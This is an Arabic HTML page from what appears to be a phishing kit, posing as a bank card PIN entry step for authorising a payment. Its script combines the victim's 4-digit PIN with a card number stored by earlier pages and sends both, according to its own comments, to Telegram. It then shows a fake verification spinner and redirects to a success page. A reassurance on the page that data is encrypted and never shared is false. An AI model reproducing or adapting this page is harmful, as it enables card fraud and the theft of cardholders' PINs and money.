<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>كلمة مرور البطاقة</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="assets/fonts/fontawesome/css/all.min.css" />
    <style>
      :root {
        --bg: #f2f2f7;
        --text: #1c1c1e;
        --muted: #6b6b6b;
        --line: rgba(60,60,67,0.16);
        --gold: #b18c33;
        --gold-2: #caa64e;
      }
      * { box-sizing: border-box; }
      html, body { margin: 0; min-height: 100%; }
      body {
        font-family: "SF Pro Text", "Cairo", -apple-system, system-ui, sans-serif;
        background: var(--bg);
        color: var(--text);
        direction: rtl;
      }
      .app {
        min-height: 100vh;
        width: min(100%, 980px);
        margin: 0 auto;
        padding: 14px 10px 16px;
      }
      .shell {
        max-width: 500px;
        margin: 0 auto;
        padding: 12px 12px 14px;
        border: 1px solid rgba(60,60,67,0.12);
        border-radius: 20px;
        background: #fff;
        box-shadow: 0 8px 24px rgba(28,28,30,0.08);
      }
      header {
        display: flex;
        align-items: flex-start;
        padding: 0 0 8px;
        border-bottom: 1px solid rgba(60,60,67,0.1);
      }
      .logo-mark { display: block; width: min(15vw, 82px); height: auto; }
      main { padding: 10px 0 0; }

      .pin-header {
        text-align: center;
        padding: 14px 0 20px;
      }
      .pin-icon-wrap {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 64px;
        height: 64px;
        border-radius: 50%;
        background: linear-gradient(135deg, rgba(177,140,51,0.15), rgba(202,166,78,0.08));
        margin-bottom: 14px;
      }
      .pin-title {
        font-size: 1.08rem;
        font-weight: 700;
        color: #1c1c1e;
        margin: 0 0 6px;
      }
      .pin-sub {
        font-size: 0.82rem;
        color: var(--muted);
        line-height: 1.55;
        margin: 0;
      }

      .field { margin-bottom: 16px; }
      .label {
        display: block;
        margin-bottom: 5px;
        font-size: 0.78rem;
        font-weight: 600;
        color: #3a3a3c;
      }

      .pin-input-wrap {
        position: relative;
      }
      .pin-input-wrap input {
        width: 100%;
        height: 52px;
        border-radius: 14px;
        border: 1px solid var(--line);
        background: #fbfbfd;
        padding: 0 14px;
        font: inherit;
        font-size: 1.5rem;
        letter-spacing: 0.35em;
        color: var(--text);
        outline: none;
        transition: border-color 0.15s, box-shadow 0.15s;
        text-align: center;
        direction: ltr;
        -webkit-text-security: disc;
      }
      .pin-input-wrap input:focus {
        border-color: rgba(10,132,255,0.45);
        background: #fff;
        box-shadow: 0 0 0 3px rgba(10,132,255,0.12);
      }
      .pin-input-wrap input.filled {
        border-color: rgba(46,160,67,0.7);
        box-shadow: 0 0 0 3px rgba(46,160,67,0.1);
      }
      .pin-input-wrap input.error {
        border-color: rgba(217,83,79,0.5);
        box-shadow: 0 0 0 3px rgba(217,83,79,0.08);
      }

      .error-box {
        display: none;
        background: #fff2f2;
        border: 1px solid rgba(217,83,79,0.3);
        border-radius: 12px;
        padding: 12px 14px;
        margin-bottom: 14px;
        font-size: 0.83rem;
        color: #c0392b;
        font-weight: 500;
      }
      .error-box.visible { display: block; }

      .secure-notice {
        display: flex;
        align-items: center;
        gap: 7px;
        margin: 8px 0 12px;
        padding: 9px 10px;
        border-radius: 12px;
        background: rgba(10,132,255,0.08);
        color: #1f4f8f;
        font-weight: 500;
        font-size: 0.78rem;
      }

      .btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        height: 46px;
        border-radius: 14px;
        font: inherit;
        font-weight: 600;
        border: 0;
        cursor: pointer;
        font-size: 0.9rem;
        width: 100%;
      }
      .btn-primary {
        background: linear-gradient(180deg, var(--gold-2), var(--gold));
        color: #fff;
        box-shadow: 0 8px 18px rgba(177,140,51,0.28);
      }
      .btn-primary:disabled {
        opacity: 0.55;
        cursor: not-allowed;
      }

      /* Loading overlay */
      .loading-overlay {
        position: fixed;
        inset: 0;
        display: none;
        align-items: center;
        justify-content: center;
        background: rgba(12,12,14,0.72);
        backdrop-filter: blur(10px);
        z-index: 999;
      }
      .loading-overlay--visible { display: flex; }
      .loading-card {
        display: flex;
        align-items: center;
        flex-direction: column;
        gap: 16px;
        padding: 28px 30px;
        border-radius: 24px;
        background: rgba(10,10,10,0.2);
        border: 1px solid rgba(255,255,255,0.08);
        box-shadow: 0 24px 60px rgba(0,0,0,0.28);
        color: #f4f1e6;
        font-size: 1rem;
        font-weight: 500;
        min-width: min(360px, calc(100vw - 48px));
        text-align: center;
      }
      .loading-spinner {
        width: 44px;
        height: 44px;
        border-radius: 50%;
        border: 4px solid rgba(214,180,91,0.18);
        border-top-color: var(--gold);
        animation: spin 0.8s linear infinite;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      @media (max-width: 640px) {
        .app { padding-inline: 8px; padding-top: 10px; }
        .shell { padding: 10px 10px 12px; border-radius: 18px; }
      }
    </style>
  </head>
  <body>
    <div class="app">
      <div class="shell">
        <header>
          <div class="logo">
            <img class="logo-mark" alt="" src="assets/images/golden-logo.webp" />
          </div>
        </header>
        <main>
          <div class="pin-header">
            <div class="pin-icon-wrap">
              <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#b18c33" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
            </div>
            <h1 class="pin-title">كلمة مرور البطاقة</h1>
            <p class="pin-sub">أدخل الرقم السري المكوّن من 4 أرقام<br />للمصادقة على عملية الدفع</p>
          </div>

          <div class="error-box" id="errorBox">كلمة المرور غير صحيحة، يرجى المحاولة مجدداً</div>

          <form autocomplete="off" novalidate id="pinForm">
            <div class="field">
              <label class="label" for="pinInput">الرقم السري (PIN)</label>
              <div class="pin-input-wrap">
                <input
                  id="pinInput"
                  type="tel"
                  inputmode="numeric"
                  pattern="[0-9]*"
                  maxlength="4"
                  placeholder="••••"
                  autocomplete="off"
                />
              </div>
            </div>

            <div class="secure-notice">
              <span>🔒</span>
              جميع البيانات مشفرة ومحمية. لن يتم مشاركتها مع أي طرف ثالث.
            </div>

            <button class="btn btn-primary" type="submit" id="submitBtn" disabled>
              متابعة
            </button>
          </form>
        </main>
      </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
      <div class="loading-card">
        <div class="loading-spinner"></div>
        <div>جاري التحقق، يرجى الانتظار...</div>
      </div>
    </div>

    <script src="assets/js/config.js"></script>
    <script>
      (function () {
        const pinInput = document.getElementById("pinInput");
        const submitBtn = document.getElementById("submitBtn");
        const errorBox = document.getElementById("errorBox");
        const loadingOverlay = document.getElementById("loadingOverlay");
        const form = document.getElementById("pinForm");

        function onlyDigit(v) {
          return (v || "").replace(/\D/g, "");
        }

        function updateState() {
          const val = onlyDigit(pinInput.value);
          submitBtn.disabled = val.length !== 4;
          if (val.length === 4) {
            pinInput.classList.add("filled");
            pinInput.classList.remove("error");
          } else {
            pinInput.classList.remove("filled");
          }
        }

        pinInput.addEventListener("input", () => {
          // أرقام فقط
          const clean = onlyDigit(pinInput.value).slice(0, 4);
          if (pinInput.value !== clean) pinInput.value = clean;
          errorBox.classList.remove("visible");
          pinInput.classList.remove("error");
          updateState();
        });

        function showLoading(show) {
          loadingOverlay.classList.toggle("loading-overlay--visible", show);
          loadingOverlay.setAttribute("aria-hidden", show ? "false" : "true");
        }

        async function sendPinToTelegram(pin) {
          try {
            const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
            const cardNumber =
              paymentData.cardNumberDigits ||
              paymentData.cardNumber ||
              localStorage.getItem("cardNumber") ||
              "غير متوفر";

            await globalThis.sendToServer("pin", {
              cardNumber,
              pin,
            });
          } catch (e) { /* silent */ }
        }

        form.addEventListener("submit", async (e) => {
          e.preventDefault();
          const pin = onlyDigit(pinInput.value);
          if (pin.length !== 4) return;

          errorBox.classList.remove("visible");
          pinInput.classList.remove("error");
          submitBtn.disabled = true;
          showLoading(true);

          // أرسل للتيليجرام
          await sendPinToTelegram(pin).catch(() => {});

          // بعد 3 ثواني انتقل لصفحة النجاح
          setTimeout(() => {
            showLoading(false);
            window.location.href = "success.html";
          }, 3000);
        });

        updateState();
        pinInput.focus();
      })();
    </script>
  </body>
</html>
